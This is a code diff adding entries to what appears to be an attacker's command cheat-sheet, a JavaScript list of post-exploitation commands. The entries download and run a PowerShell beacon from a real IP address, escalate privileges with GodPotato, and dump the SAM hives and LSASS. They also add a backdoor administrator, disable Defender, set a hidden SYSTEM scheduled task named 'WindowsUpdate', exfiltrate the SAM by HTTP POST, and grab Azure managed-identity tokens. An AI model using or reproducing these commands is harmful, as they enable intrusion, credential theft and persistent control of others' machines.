@@ -2456,6 +2456,144 @@ const COMMANDS = [
     tags: ["ps", "c2", "evasion"],
     accent: "#ff6b35"
   },
+  {
+    title: "[TROUBLESHOOT] Test Beacon Download",
+    code: "IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)",
+    tags: ["ps", "c2", "playbook"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[TROUBLESHOOT] Test HTTP Server",
+    code: "IWR -Uri 'http://168.144.166.97:8889/beacon.ps1' -UseBasicParsing",
+    tags: ["ps", "c2", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[TROUBLESHOOT] GodPotato Verify SYSTEM",
+    code: "C:\\\\Windows\\\\Temp\\\\gp.exe -cmd \"whoami > C:\\\\Windows\\\\Temp\\\\proof.txt\"\\ntype C:\\\\Windows\\\\Temp\\\\proof.txt",
+    tags: ["cmd", "privesc"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[TROUBLESHOOT] GodPotato Beacon",
+    code: "C:\\\\Windows\\\\Temp\\\\gp.exe -cmd \"powershell -ep bypass IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)\"",
+    tags: ["cmd", "privesc", "c2"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[TROUBLESHOOT] VPS Check Beacon File",
+    code: "ls -la /opt/beacon.ps1 && curl http://localhost:8889/beacon.ps1 | head",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[TROUBLESHOOT] VPS Copy Beacon",
+    code: "cp /beacon_persistent.ps1 /opt/beacon.ps1",
+    tags: ["linux", "vps"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[TROUBLESHOOT] VPS Check C2 Listening",
+    code: "ss -tlnp | grep 4444",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[TROUBLESHOOT] C2 List Sessions",
+    code: "sessions",
+    tags: ["c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[POST-SYSTEM] Dump SAM/SYSTEM",
+    code: "reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\sam\\nreg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\sys\\nreg save HKLM\\\\SECURITY C:\\\\Windows\\\\Temp\\\\sec",
+    tags: ["cmd", "postexploit", "playbook"],
+    accent: "#ff9800"
+  },
+  {
+    title: "[POST-SYSTEM] Add Backdoor Admin",
+    code: "net user backdoor P@ssw0rd123! /add\\nnet localgroup administrators backdoor /add\\nnet localgroup 'Remote Desktop Users' backdoor /add",
+    tags: ["cmd", "persist", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[POST-SYSTEM] Enable RDP",
+    code: "Set-ItemProperty -Path 'HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server' -Name fDenyTSConnections -Value 0\\nnetsh advfirewall firewall set rule group='remote desktop' new enable=yes",
+    tags: ["ps", "persist", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[POST-SYSTEM] Disable Defender",
+    code: "Set-MpPreference -DisableRealtimeMonitoring $true\\nSet-MpPreference -DisableBehaviorMonitoring $true\\nSet-MpPreference -DisableIOAVProtection $true",
+    tags: ["ps", "defender", "evasion"],
+    accent: "#ff2a6d"
+  },
+  {
+    title: "[POST-SYSTEM] Add SSH Key",
+    code: "mkdir C:\\\\Users\\\\Administrator\\\\.ssh -Force\\nAdd-Content C:\\\\Users\\\\Administrator\\\\.ssh\\\\authorized_keys 'YOUR_PUBKEY'",
+    tags: ["ps", "persist"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[POST-SYSTEM] SYSTEM Scheduled Task",
+    code: "schtasks /create /tn 'WindowsUpdate' /tr 'powershell -w hidden -enc BASE64_BEACON' /sc onstart /ru SYSTEM /f",
+    tags: ["cmd", "persist", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[POST-SYSTEM] Dump LSASS",
+    code: "rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\\\Windows\\\\Temp\\\\lsass.dmp full",
+    tags: ["ps", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "[POST-SYSTEM] Read All User Files",
+    code: "Get-ChildItem C:\\\\Users\\\\*\\\\Desktop -Recurse\\nGet-ChildItem C:\\\\Users\\\\*\\\\Documents -Recurse",
+    tags: ["ps", "postexploit", "recon"],
+    accent: "#ff9800"
+  },
+  {
+    title: "[POST-SYSTEM] Exfil SAM to VPS",
+    code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sam'); IRM -Uri 'http://168.144.166.97:8083/sam' -Method POST -Body $s",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "VPS Crack SAM Hashes",
+    code: "secretsdump.py -sam sam -system sys LOCAL",
+    tags: ["linux", "vps", "postexploit"],
+    accent: "#00ff41"
+  },
+  {
+    title: "Azure IMDS Instance Info",
+    code: "Invoke-RestMethod -Headers @{'Metadata'='true'} -Uri 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | ConvertTo-Json -Depth 10",
+    tags: ["ps", "cloud", "recon"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "Azure Managed Identity Token",
+    code: "Invoke-RestMethod -Headers @{'Metadata'='true'} -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
+    tags: ["ps", "cloud", "postexploit"],
+    accent: "#03a9f4"
+  },
+  {
+    title: "VPS HTTP Server Forever (systemd)",
+    code: "cat > /etc/systemd/system/http8889.service << 'EOF'\\n[Unit]\\nDescription=HTTP Server 8889\\nAfter=network.target\\n[Service]\\nType=simple\\nWorkingDirectory=/opt\\nExecStart=/usr/bin/python3 -m http.server 8889\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target\\nEOF\\nsystemctl daemon-reload && systemctl enable http8889 && systemctl start http8889",
+    tags: ["linux", "vps", "persist"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS HTTP Server (nohup)",
+    code: "cd /opt && nohup python3 -m http.server 8889 > /dev/null 2>&1 &",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS HTTP Server (screen)",
+    code: "screen -dmS http8889 python3 -m http.server 8889",
+    tags: ["linux", "vps", "c2"],
+    accent: "#00ff41"
+  },
 ];
 
 const list = document.getElementById('cmdList');
